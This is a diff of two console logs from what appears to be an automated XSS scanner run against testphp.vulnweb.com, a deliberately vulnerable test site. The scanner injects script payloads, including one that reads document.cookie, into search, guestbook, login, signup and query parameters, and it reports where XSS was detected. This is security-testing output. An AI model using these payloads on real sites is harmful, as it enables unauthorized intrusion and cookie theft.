-[[1;33m06:50:21[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:21[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:21[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:21[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:21[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:22[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:22[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:34[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/listproducts.php?artist=2
+[[1;33m09:42:35[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:35[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:35[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:35[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:35[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:35[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:36[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:36[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:36[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=7[0m Maybe a vuln XSS point
+[[1;33m09:42:36[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>console.log(5000/3000)</script>
+[[1;33m09:42:36[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:36[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:36[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/7.jpg[0m Maybe a vuln XSS point
+[[1;33m09:42:36[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>console.log(5000/3000)</script>
+[[1;33m09:42:36[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:37[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:37[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=2[0m Maybe a vuln XSS point
+[[1;33m09:42:37[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:37[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:38[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:38[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=2[0m Maybe a vuln XSS point
+[[1;33m09:42:38[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:38[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:38[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
 [1;37m***************
-[[1;33m06:50:22[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/listproducts.php?cat=4
-[[1;33m06:50:23[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:23[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:23[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:23[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:23[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:23[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:23[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:23[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:38[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/artists.php?artist=3
+[[1;33m09:42:39[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:39[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:39[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:39[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:39[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:39[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:39[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:39[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:39[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=3[0m Maybe a vuln XSS point
+[[1;33m09:42:39[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:39[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:40[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:40[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=3[0m Maybe a vuln XSS point
+[[1;33m09:42:40[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:40[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:40[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
 [1;37m***************
-[[1;33m06:50:24[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/artists.php
-[[1;33m06:50:25[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:25[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:25[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:25[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:25[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:25[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:25[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:25[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
-[[1;33m06:50:25[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:50:25[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:25[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:26[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:26[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=2[0m Maybe a vuln XSS point
-[[1;33m06:50:26[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:26[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:27[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:27[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=3[0m Maybe a vuln XSS point
-[[1;33m06:50:27[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:27[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:28[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:41[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/listproducts.php?artist=3
+[[1;33m09:42:42[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:42[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:42[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:42[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:42[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:42[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:42[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:42[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:50:28[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/artists.php?artist=3
-[[1;33m06:50:29[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:29[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:29[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:29[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:29[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:29[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:30[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:30[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
-[[1;33m06:50:30[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=3[0m Maybe a vuln XSS point
-[[1;33m06:50:30[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:30[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:30[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:30[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=3[0m Maybe a vuln XSS point
-[[1;33m06:50:30[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:30[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:31[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:42[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/disclaimer.php
+[[1;33m09:42:43[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:43[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:43[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:43[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:43[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:43[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:43[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:43[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:50:31[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/listproducts.php?artist=3
-[[1;33m06:50:32[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:32[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:32[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:32[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:32[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:32[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:33[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:33[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:44[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/cart.php
+[[1;33m09:42:45[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:45[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:45[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:45[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:45[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:45[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:46[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:46[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:50:33[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/disclaimer.php
-[[1;33m06:50:33[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:33[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:33[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:33[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:33[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:33[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:34[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:34[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:46[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/guestbook.php
+[[1;33m09:42:47[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:47[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/guestbook.php
+[[1;33m09:42:47[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:47[0m] [[1;32mINFO[0m] Form key name: [1;32mname[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:47[0m] [[1;32mINFO[0m] Internal error: 'type'
+[[1;33m09:42:47[0m] [[1;32mINFO[0m] Form key name: [1;32msubmit[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:47[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:48[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/guestbook.php
+[[1;33m09:42:48[0m] [[1;31mCRITICAL[0m] Post data: {'name': '<script>console.log(5000/3000)</script>', 'submit': 'submit'}
+[[1;33m09:42:48[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:48[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:48[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:48[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:48[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:48[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:48[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:50:35[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/cart.php
-[[1;33m06:50:35[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:35[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:35[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:35[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:35[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:35[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:36[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:36[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:49[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/AJAX/index.php
+[[1;33m09:42:50[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
 [1;37m***************
-[[1;33m06:50:37[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/guestbook.php
-[[1;33m06:50:37[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:37[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/guestbook.php
-[[1;33m06:50:37[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:37[0m] [[1;32mINFO[0m] Form key name: [1;32mname[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:37[0m] [[1;32mINFO[0m] Internal error: 'type'
-[[1;33m06:50:37[0m] [[1;32mINFO[0m] Form key name: [1;32msubmit[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:37[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:38[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/guestbook.php
-[[1;33m06:50:38[0m] [[1;31mCRITICAL[0m] Post data: {'name': '<script>prompt(document.cookie)</script>', 'submit': 'submit'}
-[[1;33m06:50:38[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:38[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:38[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:38[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:38[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:38[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:38[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:51[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/login.php
+[[1;33m09:42:52[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:52[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/userinfo.php
+[[1;33m09:42:52[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:52[0m] [[1;32mINFO[0m] Form key name: [1;32muname[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:52[0m] [[1;32mINFO[0m] Form key name: [1;32mpass[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:52[0m] [[1;32mINFO[0m] Internal error: 'name'
+[[1;33m09:42:52[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:53[0m] [[1;32mINFO[0m] Parameter page using (POST) payloads but not 100% yet...
+[[1;33m09:42:53[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:53[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:53[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:53[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:53[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:53[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:53[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:50:39[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/AJAX/index.php
-[[1;33m06:50:39[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:54[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/signup.php
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:55[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/secured/newuser.php
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32muuname[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32mupass[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32mupass2[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32murname[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32mucc[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32muemail[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32muphone[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Internal error: 'type'
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32msignup[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:55[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/secured/newuser.php
+[[1;33m09:42:55[0m] [[1;31mCRITICAL[0m] Post data: {'uuname': '<script>console.log(5000/3000)</script>', 'upass': '<script>console.log(5000/3000)</script>', 'upass2': '<script>console.log(5000/3000)</script>', 'urname': '<script>console.log(5000/3000)</script>', 'ucc': '<script>console.log(5000/3000)</script>', 'uemail': '<script>console.log(5000/3000)</script>', 'uphone': '<script>console.log(5000/3000)</script>', 'signup': 'signup'}
+[[1;33m09:42:55[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:55[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:55[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:55[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
 [1;37m***************
-[[1;33m06:50:40[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/login.php
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:41[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/userinfo.php
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Form key name: [1;32muname[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Form key name: [1;32mpass[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Internal error: 'name'
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Parameter page using (POST) payloads but not 100% yet...
-[[1;33m06:50:41[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:41[0m] [[1;32mINFO[0m] Sending payload (POST) method...
